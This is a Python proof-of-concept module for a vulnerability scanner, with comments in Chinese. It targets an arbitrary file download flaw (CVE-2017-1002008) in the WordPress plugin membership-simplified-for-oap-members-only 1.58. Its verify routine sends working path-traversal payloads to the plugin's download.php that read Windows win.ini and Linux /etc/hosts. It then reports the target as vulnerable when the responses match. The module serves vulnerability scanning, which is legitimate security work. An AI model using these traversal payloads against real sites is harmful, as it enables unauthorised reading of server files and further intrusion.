# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'CNVD-2017-27437' # 平台漏洞编号
    name = 'WordPress membership-simplified-for-oap-members-only插件任意文件下载' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2018-04-10'  # 漏洞公布时间
    desc = '''
    WordPress membership-simplified-for-oap-members-only插件任意文件下载
    ''' # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2017-27437' #
    cnvd_id = 'CNVD-2017-27437' # cnvd漏洞编号
    cve_id = 'CVE-2017-1002008'  # cve编号
    product = 'WordPress'  # 漏洞组件名称
    product_version = 'WordPress membership-simplified-for-oap-members-only 1.58'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'bd304d33-e50a-42e1-90b3-ad84edf644b2' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-08-01' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            win_payload = "/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file=../../../../../../../../../../../Windows/win.ini"
            linux_payload = "/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file=../../../../../../../../../../../etc/hosts"
            win_url = arg + win_payload
            linux_url = arg + linux_payload

            headers = {
                'Content-Type':'application/x-www-form-urlencoded',
            }
            win_response = requests.get(win_url)
            linux_response = requests.get(linux_url)
            self.output.info("正在尝试读取系统敏感文件信息")
            if win_response.status_code ==200 and 'extensions' in win_response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))

            if linux_response.status_code ==200 and 'localhost' in linux_response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()